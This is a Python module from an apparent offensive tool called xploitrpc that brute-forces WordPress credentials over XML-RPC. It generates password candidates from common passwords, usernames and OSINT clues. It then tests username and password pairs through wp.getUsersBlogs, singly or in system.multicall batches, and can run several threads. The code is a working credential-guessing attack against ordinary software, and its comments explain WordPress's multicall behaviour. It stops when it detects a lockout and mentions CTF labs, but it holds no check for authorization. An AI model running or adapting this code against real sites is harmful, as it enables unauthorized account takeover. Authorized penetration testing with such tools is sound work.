"""xrpc.auth - extracted from the original xploitrpc monolith."""
from __future__ import annotations
import argparse, base64, gzip, ipaddress, json, html, itertools, os, random
import re, socket, ssl, string, sys, threading, time
import urllib.error, urllib.parse, urllib.request, xmlrpc.client
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, Dict, Iterable, List, Optional, Sequence, Tuple

try:
    from . import wpcompat
except ImportError:  # running a module file directly
    try:
        import wpcompat
    except ImportError:
        wpcompat = None

from .core import (
    Term, ok, bad, warn, info, note, head, kv, die,
    RPCError, TransportError, ProtocolError, RPCFault,
    normalize_url, RPCResult, RPCClient, WPSession, State,
    version_tuple, print_findings, write_report, print_banner,
    SEVERITY_ORDER, SEVERITY_COLOR,
    DEFAULT_UA, DEFAULT_TIMEOUT, BANNER_DELAY, __version__,
    is_disabled_fault, describe_fault,
)
from .payloads import COMMON_PASSWORDS, LOCKOUT_PATTERNS

@dataclass
class Credential:
    username: str
    password: str
    blog_id: Optional[str] = None
    blogs: List[Any] = field(default_factory=list)


def _read_wordlist(path: str) -> List[str]:
    """Read a wordlist with sane encoding handling and de-duplication."""
    for enc in ("utf-8-sig", "utf-8", "latin-1"):
        try:
            with open(path, "r", encoding=enc, errors="strict") as fh:
                lines = [ln.strip() for ln in fh]
            break
        except UnicodeDecodeError:
            continue
        except OSError as exc:
            raise RPCError("cannot read %s: %s" % (path, exc))
    else:
        raise RPCError("cannot decode %s with any known encoding" % path)

    seen = set()
    out = []
    for ln in lines:
        if not ln or ln.startswith("#"):
            continue
        if ln not in seen:
            seen.add(ln)
            out.append(ln)
    return out


def derive_candidates(usernames: Sequence[str],
                      clues: Sequence[str] = ()) -> List[str]:
    """
    Build a sensible password candidate list with no wordlist file.

    Combines common passwords, each username, and any OSINT clues, then adds
    light mutations (capitalisation, 1/123/! suffixes, year). CTF labs and
    real-world weak passwords both tend to live in this small space.
    """
    seeds = list(COMMON_PASSWORDS)
    for u in usernames:
        seeds.extend([u, u.lower(), u.capitalize()])
    for c in clues:
        seeds.append(c)
        seeds.append(c.lower())

    out: List[str] = []
    seen = set()

    def add(p: str) -> None:
        if p and p not in seen:
            seen.add(p)
            out.append(p)

    for s in seeds:
        s = s.strip()
        if not s:
            continue
        add(s)
        add(s.capitalize())
        add(s.upper())
        for suffix in ("1", "123", "!", "2020", "2021", "2024", "2026"):
            add(s + suffix)
            add(s.capitalize() + suffix)
    return out


class LockoutDetected(Exception):
    """Raised when the target's brute-force protection answers, mid-run."""

    def __init__(self, message: str, remaining: Optional[int] = None):
        self.remaining = remaining
        super().__init__(message)


def detect_lockout(message: str) -> Optional[int]:
    """
    Detect a brute-force lockout message in a fault string.

    Returns the remaining-attempts count when the message states one, else 0
    for a hard lockout, else None when this is not a lockout message.
    """
    text = re.sub(r"<[^>]+>", "", message or "").lower()
    for pattern in LOCKOUT_PATTERNS:
        m = re.search(pattern, text)
        if not m:
            continue
        if m.groups():
            try:
                return int(m.group(1))
            except (ValueError, IndexError):
                return 0
        return 0
    return None


def _auth_call(client: RPCClient, user: str, pwd: str) -> Tuple[bool, Any]:
    """
    One credential check. Returns (success, payload).

    Always passes strings - the original tool's ast.literal_eval turned a
    password of 123456 into the integer 123456, which WordPress rejects.

    Raises LockoutDetected when the target's protection answers, so the caller
    can stop before it makes the lockout worse.
    """
    try:
        val = client.call_value("wp.getUsersBlogs", str(user), str(pwd))
        return True, val
    except RPCFault as exc:
        # 403/401 = bad creds, but the message may carry a lockout counter.
        if exc.code in (403, 401):
            remaining = detect_lockout(exc.message or "")
            if remaining is not None:
                raise LockoutDetected(exc.message or "locked", remaining)
            return False, exc
        raise
    except RPCError:
        raise


def module_brute(
    client: RPCClient,
    state: "State",
    usernames: Sequence[str],
    passwords: Sequence[str],
    batch_size: int = 50,
    use_multicall: bool = False,
    stop_on_first: bool = True,
    threads: int = 1,
) -> List[Credential]:
    """
    Credential testing.

    IMPORTANT - why multicall is off by default:

    WordPress core (wp-includes/class-wp-xmlrpc-server.php) sets
    $this->auth_failed = true on the first failed login and then short-circuits
    every later authentication attempt in the SAME request to fault 403 without
    ever checking the password:

        if ( $this->auth_failed ) { $user = new WP_Error( 'login_prevented' ); }

    So a system.multicall batch containing one wrong password returns 403 for
    every credential after it, including the correct one. Batching therefore
    produces false negatives and cannot be trusted for correctness.

    It is still useful for measuring server behaviour and for the amplification
    test, so it is kept behind an explicit flag, but the default path is one
    request per credential.
    """
    head("Credential testing")
    if not usernames:
        bad("No usernames supplied.")
        return []
    if not passwords:
        bad("No passwords supplied.")
        return []

    total = len(usernames) * len(passwords)
    info("%d user(s) x %d password(s) = %d candidate pair(s)" % (
        len(usernames), len(passwords), total))

    if use_multicall:
        warn("Multicall mode: WordPress poisons the batch after the first failed")
        warn("login, so results AFTER a wrong password are unreliable.")
        warn("Omit --multicall (the default) for trustworthy results.")
    else:
        info("Mode: one request per credential (reliable)")

    found: List[Credential] = []
    tested = 0
    started = time.time()
    stop_flag = threading.Event()

    def record(user: str, pwd: str, blogs: Any) -> None:
        cred = Credential(username=user, password=pwd, blogs=blogs or [])
        # wp.getUsersBlogs returns a list of blog structs. Through multicall the
        # payload arrives already unwrapped, so accept either shape.
        first: Any = None
        if isinstance(blogs, list) and blogs:
            first = blogs[0]
        elif isinstance(blogs, dict):
            first = blogs
        if isinstance(first, dict):
            cred.blog_id = str(first.get("blogid") or first.get("blog_id") or "") or None
        found.append(cred)
        print()
        ok("VALID: %s : %s%s" % (
            user, pwd, "  (blog_id=%s)" % cred.blog_id if cred.blog_id else ""))

    def progress() -> None:
        elapsed = max(time.time() - started, 1e-6)
        rate = tested / elapsed
        shown = min(tested, total)
        sys.stdout.write("\r    %d/%d tested  %.1f/s  %d found   " % (
            shown, total, rate, len(found)))
        sys.stdout.flush()

    def verify(user: str, pwd: str) -> Optional[Tuple[str, str, Any]]:
        """One authoritative check, always its own request."""
        try:
            success, payload = _auth_call(client, user, pwd)
        except LockoutDetected as exc:
            stop_flag.set()
            bad("LOCKOUT DETECTED on %s: %s" % (user, exc))
            if exc.remaining:
                warn("%d attempt(s) remain before lockout - stopping to preserve them."
                     % exc.remaining)
            else:
                warn("The account or source IP is now locked out.")
            warn("A credential test that ignores this would lock the account out")
            warn("and deny a real user access. Re-run later or reduce the rate.")
            return None
        except RPCFault as exc:
            if is_disabled_fault(exc):
                stop_flag.set()
                bad("XML-RPC disabled mid-run: %s" % exc)
            return None
        except RPCError as exc:
            if client.verbose:
                note("transport error on %s:%s -> %s" % (user, pwd, exc))
            return None
        if success:
            return (user, pwd, payload)
        return None

    try:
        if use_multicall:
            # Batched sweep. Every hit is re-verified in its own request, and
            # the batch is abandoned as soon as a fault appears because
            # everything after it is untrustworthy.
            for user in usernames:
                if stop_flag.is_set():
                    break
                for i in range(0, len(passwords), batch_size):
                    if stop_flag.is_set():
                        break
                    chunk = passwords[i:i + batch_size]
                    calls = [
                        {"methodName": "wp.getUsersBlogs", "params": [str(user), str(p)]}
                        for p in chunk
                    ]
                    try:
                        res = client.multicall(calls)
                    except RPCFault as exc:
                        if is_disabled_fault(exc):
                            bad("system.multicall is disabled on this server.")
                            return found
                        warn("multicall fault (%s) - falling back to single requests." % exc.code)
                        use_multicall = False
                        break
                    except RPCError as exc:
                        warn("multicall transport failure: %s - falling back." % exc)
                        use_multicall = False
                        break

                    results = res.value if isinstance(res.value, list) else []
                    poisoned = False
                    for pwd, item in zip(chunk, results):
                        tested += 1
                        if isinstance(item, list):
                            # Confirm outside the batch before believing it.
                            hit = verify(user, pwd)
                            if hit:
                                record(*hit)
                                if stop_on_first:
                                    stop_flag.set()
                                    break
                        elif isinstance(item, dict):
                            code = item.get("faultCode")
                            if code in (403, 401):
                                poisoned = True
                            elif code not in (403, 401):
                                note("unexpected fault for %s:%s -> %s"
                                     % (user, pwd, item.get("faultString")))
                    progress()
                    if poisoned:
                        warn("auth failure in batch - remaining results in this "
                             "batch are unreliable, switching to single requests.")
                        use_multicall = False
                        break

        if not use_multicall:
            pairs = [(u, p) for u in usernames for p in passwords]
            if threads > 1:
                with ThreadPoolExecutor(max_workers=threads) as pool:
                    futures = {pool.submit(verify, u, p): (u, p) for u, p in pairs}
                    for fut in as_completed(futures):
                        tested += 1
                        hit = fut.result()
                        if hit:
                            record(*hit)
                            if stop_on_first:
                                stop_flag.set()
                                for f in futures:
                                    f.cancel()
                                break
                        if tested % 10 == 0:
                            progress()
            else:
                for u, p in pairs:
                    if stop_flag.is_set():
                        break
                    tested += 1
                    hit = verify(u, p)
                    if hit:
                        record(*hit)
                        if stop_on_first:
                            break
                    if tested % 10 == 0:
                        progress()
            progress()
    except KeyboardInterrupt:
        print()
        warn("Interrupted after %d attempt(s)." % tested)

    print()
    elapsed = time.time() - started
    if found:
        ok("%d valid credential set(s) in %.1fs (%d attempts, %.1f/s)." % (
            len(found), elapsed, tested, tested / max(elapsed, 1e-6)))
        state.credentials.extend(found)
        # Adopt the first hit so later modules can use it immediately.
        if not state.has_creds():
            state.username = found[0].username
            state.password = found[0].password
            state.blog_id = found[0].blog_id or state.blog_id
    else:
        warn("No valid credentials in %d attempt(s) (%.1fs)." % (tested, elapsed))
    return found


